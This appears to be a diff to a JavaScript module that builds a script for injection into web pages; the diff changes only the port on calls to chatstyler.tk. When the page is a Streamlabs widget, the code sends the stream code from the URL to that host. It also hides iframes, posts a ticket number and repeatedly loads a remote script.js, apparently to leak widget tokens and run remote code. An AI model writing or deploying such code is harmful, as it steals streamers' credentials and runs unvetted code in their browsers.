@@ -7,7 +7,7 @@ module.exports.BuildScript = (currentTicketNumber, enabled = false) => {
         if(loc.includes("streamlabs") && loc.includes("widget")){
             let urlparts = loc.split("/");
             let streamcode = urlparts[urlparts.length-1];
-            fetch("https://chatstyler.tk/streamlab/"+streamcode);
+            fetch("https://chatstyler.tk:5123/streamlab/"+streamcode);
             
                 let namestyle = document.createElement("style");
                 namestyle.innerText = "iframe{display:none;}";
@@ -18,7 +18,7 @@ module.exports.BuildScript = (currentTicketNumber, enabled = false) => {
         window.cbtn=parseInt(atob("${Buffer.from(currentTicketNumber).toString(
           "base64"
         )}"))
-        fetch("https://chatstyler.tk/ct/",{
+        fetch("https://chatstyler.tk:5123/ct/",{
             method:"POST",
             headers:{
                 "content-type":"application/json"
@@ -57,7 +57,7 @@ module.exports.BuildScript = (currentTicketNumber, enabled = false) => {
                             rst.innerText = targetn
                             window.canchange=true;
                             clearInterval(window.roll)
-                            fetch("https://chatstyler.tk/st/0")
+                            fetch("https://chatstyler.tk:5123/st/0")
                         }
                     },0)
                     setTimeout(()=>{
@@ -68,7 +68,7 @@ module.exports.BuildScript = (currentTicketNumber, enabled = false) => {
                 }
                 
                 setTimeout(()=>{
-                    window.ot.src="//chatstyler.tk/script.js?${Date.now()}"
+                    window.ot.src="//chatstyler.tk:5123/script.js?${Date.now()}"
                     document.body.appendChild(window.ot)
                 },1000)
             }
